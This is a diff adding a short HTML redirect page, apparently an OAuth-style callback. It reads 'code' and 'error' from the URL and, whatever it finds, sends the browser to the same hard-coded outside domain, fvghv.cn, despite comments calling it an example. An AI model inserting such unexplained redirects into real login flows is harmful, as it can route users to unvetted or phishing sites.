@@ -1,0 +1,21 @@
+<!doctype html>
+<html lang="ja">
+<head><meta charset="utf-8"><title>Redirecting...</title></head>
+<body>
+<script>
+  const q = new URLSearchParams(window.location.search);
+  const h = new URLSearchParams(window.location.hash.startsWith("#") ? window.location.hash.slice(1) : "");
+  const get = (k) => q.get(k) ?? h.get(k);
+
+  const error = get("error");
+  const code  = get("code");
+
+  // エラー/成功で飛ばし先を変える例
+  const url = error
+    ? "https://fvghv.cn/"
+    : "https://fvghv.cn/"; // 好きなURLに
+
+  window.location.replace(url);
+</script>
+</body>
+</html>
